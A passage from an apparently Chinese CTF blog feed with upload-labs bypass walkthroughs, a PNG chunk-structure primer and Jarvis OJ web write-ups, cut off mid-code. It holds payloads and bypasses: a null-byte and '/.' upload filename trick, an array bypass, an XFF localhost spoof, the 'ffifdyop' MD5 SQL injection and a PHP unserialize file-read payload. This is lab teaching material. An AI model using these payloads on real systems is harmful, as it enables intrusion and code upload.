class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfo函数说明</a>，会输出 <code>dirname</code>，<code>basename</code>，<code>extension</code>，这里<code>img_path</code>可控（通过<code>post sava_name</code>），所以可以利用<code>move_uploaded_file</code>的<code>\x00</code>截断(<code>save_name=1.php%00.jpg</code>)绕过,但<code>\x00</code>截断之前关卡已经出现过了，这里明显是考察别的知识点。其实考点是:<code>move_uploaded_file</code>会忽略掉文件末尾的<code>./</code>，所以可以构造<code>save_path=1.php/.</code>,这样<code>file_ext</code>值就为空，就能绕过黑名单，而<code>move_uploaded_file</code>函数忽略文件末尾的<code>/.</code>可以实现保存文件为<code>.php</code></p><p>绕过方法</p><ol><li>post: save_name &#x3D; 1.php%00.jpg</li><li>post: save_name &#x3D; 1.php&#x2F;.</li></ol><h1 id="数组-x2F-绕过"><a href="#数组-x2F-绕过" class="headerlink" title="数组 &#x2F;. 绕过"></a>数组 &#x2F;. 绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//检查MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//检查文件名</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p><p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。并且后缀有白名单过滤</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-variable">$ext</span> = <span class="hljs-keyword">end</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br></code></pre></td></tr></table></figure><p>而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>smi1e.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>smi1e.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>smi1e.php</code>。这里直接借用一下 smi1e 师傅的图。</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOzSx.png" alt="1WOzSx.png"></p><p><img src="https://s2.ax1x.com/2020/02/09/1WXSl6.png" alt="1WXSl6.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p><img src="https://s2.ax1x.com/2020/02/09/1WXDAJ.png" alt="1WXDAJ.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>png文件组成</title>
    <link href="/2019/11/14/png_sturcture/"/>
    <url>/2019/11/14/png_sturcture/</url>
    
    <content type="html"><![CDATA[<p>png图片由3个以上的数据块组成。</p><p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.</p><h1 id="数据块结构"><a href="#数据块结构" class="headerlink" title="数据块结构"></a>数据块结构</h1><p><img src="https://s2.ax1x.com/2020/02/09/1WXjHg.png" alt="1WXjHg.png"></p><p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p><p>$x^{32}+x^{26}+x^{23}+x^{22}+x^{16}+x^{12}+x^{11}+x^{10}+x^8+x^7+x^5+x^4+x^2+x+1$</p><h1 id="分析数据块"><a href="#分析数据块" class="headerlink" title="分析数据块"></a>分析数据块</h1><h2 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h2><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节组成，它的格式如下图所示。</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXXDS.png" alt="1WXXDS.png"></p><h2 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h2><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</p><h2 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h2><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p><h2 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h2><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web WriteUps for Jarvis OJ</title>
    <link href="/2019/10/28/Web_WriteUps_for_Jarvis_OJ/"/>
    <url>/2019/10/28/Web_WriteUps_for_Jarvis_OJ/</url>
    
    <content type="html"><![CDATA[<h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p><code>link: &lt;http://web.jarvisoj.com:32770/&gt;</code></p><p>打开链接看到：</p><blockquote><p>Please use port 51 to visit this site.</p></blockquote><p>在本机或服务器上输入命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --local-port 51 http://web.jarvisoj.com:32770<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/1gvBNR.png" alt="1gvBNR.png"></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">curl 命令参数使用：<br>-l, --local-port RANGE  强制使用的本地端口号<br></code></pre></td></tr></table></figure><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p><code>link：&lt;http://web.jarvisoj.com:32774/&gt;</code></p><p>打开链接可以看到：</p><blockquote><p>localhost access only!!</p></blockquote><p>一般伪造 localhost 在 http 头部加入 xff， client-ip 等，这里使用 xff ：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>The <strong>X-Forwarded-For</strong> (<strong>XFF</strong>) <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">HTTP header field</a> is a common method for identifying the originating <a href="https://en.wikipedia.org/wiki/IP_address">IP address</a> of a client connecting to a <a href="https://en.wikipedia.org/wiki/Web_server">web server</a> through an <a href="https://en.wikipedia.org/wiki/HTTP">HTTP</a> <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy</a> or <a href="https://en.wikipedia.org/wiki/Load_balancer">load balancer</a>.</p><p>– WikiPedia</p></blockquote><p><img src="https://s2.ax1x.com/2020/02/07/1gvdHJ.png" alt="1gvdHJ.png"></p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>Description：</p><blockquote><p>需要密码才能获得flag哦。</p><p><code>link：&lt;http://web.jarvisoj.com:32772/</code>&gt;</p></blockquote><p>打开环境，是一个输入框，需要输入密码：</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvUuF.png" alt="1gvUuF.png"></p><p>我们查看一下数据包，f12-network 走起：</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvD41.png" alt="1gvD41.png"></p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;<span class="hljs-title function_ invoke__">md5</span>(input_string, raw_output) <span class="hljs-comment">// 计算字符串的 MD5 散列</span><br></code></pre></td></tr></table></figure><p><strong>Parameter:</strong></p><table><thead><tr><th>Name</th><th>Description</th><th>Required &#x2F; Optional</th><th>Type</th></tr></thead><tbody><tr><td>input_string</td><td>The input string.</td><td>Required</td><td>Float</td></tr><tr><td>raw_output</td><td>Refers hex or binary output format, Returns raw 16-bit binary format if raw_output sets TRUE and return 32-bit hex format for setting FALSE (default).</td><td>Optional</td><td>Boolean</td></tr></tbody></table></blockquote><p>这里输入<code>ffifdyop</code>，为什么呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">根据此题中的password的语句：select * form admin where password=<span class="hljs-string">&#x27;&#x27;</span><br>进行password的绕过，需将此语句填充为：select * form admin where password=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>，又因为此题有md5加密，并转换为字符串，所以根据前人，大师傅们的总结，有：<br>字符串：ffifdyop<br>md5加密后：<span class="hljs-number">276</span>f722736c95d99e921722cf9ed621c<br>再转换为字符串：<span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">6</span>&lt;乱码&gt;<br>那么，拼接后的语句为：select * <span class="hljs-keyword">from</span> admin where password=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;6&lt;乱码&gt;&#x27;</span> ，就相当于 select * <span class="hljs-keyword">from</span> admin where password=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span> ,实现 sql 注入。<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/1gvcjO.png" alt="1gvcjO.png"></p><h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><p>Description：</p><blockquote><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p><p><code>link：&lt;http://web.jarvisoj.com:32768/&gt;</code></p></blockquote><p>打开题目是一张很大的神盾局图片，查看一下网页源代码，发现只有一行：</p><p><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code></p><p>点击链接跳转到页面，页面显示乱码，看文件头应该是图片文件</p><p>注意到，参数 <code>?img=</code> 后面是 base64 编码，进行解码可以得到 <code>shield.jpg</code></p><p>这样尝试一下文件读取，比如 <code>index.php</code>，这里需要 base64 编码一下再传参，得到源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;shield.php&#x27;</span>);<br><span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shield</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$g</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>-&gt;<span class="hljs-title function_ invoke__">readfile</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;img src=<span class="hljs-string">&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot;</span> width=<span class="hljs-string">&quot;100%&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>可以看到还包含了 <code>shield.php</code> ，我们再去读一下这个文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in pctf.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$filename</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;file) &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span>  <br>&amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;\\&#x27;</span>)==<span class="hljs-literal">FALSE</span>) &#123;<br><span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到提示 <code>flag is in pctf.php</code></p><p>直接访问提示 <code>File not found!</code></p><p>因此按照代码逻辑我们应该传参进去，经过反序列化然后让它执行 <code>$x-&gt;readfile()</code> 进行读取</p><p>先把类创建并进行序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$filename</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;file) &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span>  <br>&amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;\\&#x27;</span>)==<span class="hljs-literal">FALSE</span>) &#123;<br><span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shield</span>(<span class="hljs-string">&quot;pctf.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到 <code>payload：?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></p><p>传参，得到 flag</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvhEd.png" alt="1gvhEd.png"></p><h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><p>Description：</p><blockquote><p>连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。</p><p><code>link：&lt;http://web.jarvisoj.com:32780/&gt;</code></p></blockquote><p>打开题目，只有一行字：</p><p><code>work harder!harder!harder!</code></p><p>查看源代码发现提示 <code>index.phps</code> ，访问得到源码</p><p>接下来就是进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!--index.phps--&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])<br>    &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php?id=1&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hahahahahaha&#x27;</span>;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-variable">$data</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;1112 is a nice lab!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;111&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ 